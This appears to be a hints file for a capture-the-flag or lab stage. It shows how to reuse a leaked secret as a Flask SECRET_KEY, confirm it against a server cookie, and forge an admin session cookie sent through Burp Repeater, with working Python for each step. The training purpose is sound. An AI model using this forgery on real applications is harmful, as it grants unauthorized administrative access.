# Stage 2 hints — Forge a session

---

**Hint 1.** Stage 1 gave you a `client_secret`. A signed cookie is only safe
while the signing key is secret. You now hold *a* secret. Try the obvious
thing.

---

**Hint 2.** Verify before you build anything. Flask derives the signing key
from `SECRET_KEY` with HMAC-SHA1 and the salt `"cookie-session"`. Rather than
reimplement it, let Flask do it:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "<the client_secret you found>"
s = SecureCookieSessionInterface().get_signing_serializer(app)

s.loads(cookie_from_the_server)   # no exception == you have the key
```

---

**Hint 3.** If that didn't raise `BadSignature`, the app is signing your
session with a key it also *shipped to you*. You can now mint any session you
like.

---

**Hint 4.** Look at how `/admin` decides. It reads the user out of the
session. There's no database lookup to get in your way.

```python
forged = s.dumps({"user": {"email": "a@b.c", "name": "you", "role": "admin"}})
```

Send that as the `nimbus_session` cookie. In Burp: paste it into the Cookie
header in Repeater.
